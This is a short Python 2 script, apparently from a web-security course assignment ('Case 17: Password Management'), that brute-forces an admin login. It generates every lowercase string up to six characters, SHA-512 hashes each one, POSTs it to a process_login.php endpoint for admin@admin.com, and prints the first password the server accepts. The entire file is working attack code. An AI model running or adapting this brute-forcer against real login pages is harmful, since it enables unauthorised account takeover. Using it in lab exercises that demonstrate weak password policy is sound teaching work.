import hashlib
import string
import urllib
import urllib2
from itertools import product

# Case 17: Password Management (Low password complexity)

url = 'http://www.wsb.com/Assignment2/case17/includes/process_login.php'


def test_password(password):
    p = hashlib.sha512(password).hexdigest()
    payload = urllib.urlencode({'email': 'admin@admin.com',
                                'p': p})
    req = urllib2.Request(url, payload)
    rsp = urllib2.urlopen(req)
    rsp_url = rsp.geturl()
    if 'error' in rsp_url or rsp.read() == 'Invalid Request':
        return False
    return True


letters = string.ascii_lowercase  # hdls
found = False
adminpw = None

count = 0
# Bruteforce
for length in range(1, 7):
    tests = product(letters, repeat=length)
    for test in tests:
        if test_password(''.join(test)):
            found = True
            adminpw = ''.join(test)
            break

    if found:
        break
    print('length done: ' + str(length))

print(adminpw)
